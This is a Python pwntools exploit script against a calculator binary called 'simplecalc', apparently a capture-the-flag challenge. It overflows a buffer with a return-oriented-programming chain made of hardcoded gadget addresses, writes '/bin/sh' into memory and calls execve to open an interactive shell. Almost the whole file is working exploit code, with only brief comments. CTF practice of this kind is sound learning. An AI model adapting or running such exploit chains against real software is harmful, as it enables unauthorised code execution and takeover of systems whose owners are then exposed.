from pwn import *

target = process("./simplecalc")
#target = gdb.debug("./simplecalc", gdbscript = 'b *0x40154a')
#gdb.attach(target, gdbscript = 'b *0x40154a')

target.recvuntil('calculations: ')
target.sendline('100')

# Rop gadgets
pop_rax  = 0x000000000044db34
pop_rdx_rsi = 0x0000000000437aa9
pop_rdi = 0x0000000000401b73
popRdx = 0x437a85
# 0x000000000044526e : mov qword ptr [rax], rdx ; ret
mov = 0x000000000044526e
syscall = 0x0000000000400488

# Send 4 bytes 
def addSingle(x):
    target.recvuntil("=> ")
    target.sendline("1")
    target.recvuntil("Integer x: ")
    target.sendline("100")
    target.recvuntil("Integer y: ")
    target.sendline(str(x-100))

# Send 8 bytes because the register size is 8 bytes
def add(z):
    x = z & 0xffffffff
    y = ((z & 0xffffffff00000000) >> 32)
    addSingle(x)
    addSingle(y)

for i in range(9):
    add(0x0)

# Write "/bin/sh"
add(pop_rax)
add(0x6c1000)
add(popRdx)
add(0x0068732f6e69622f) # "/bin/sh" in hex
add(mov)

add(pop_rdi) # Specify pointer to "/bin/sh"
add(0x6c1000)
add(pop_rax) # Specify which syscall to make
add(0x3b)
add(pop_rdx_rsi)
add(0x0)
add(0x0)
add(syscall) # Syscall instruction

target.sendline('5') # Save and exit to execute memcpy and trigger buffer overflow

# Drop to an interactive shell to use our new shell
target.interactive()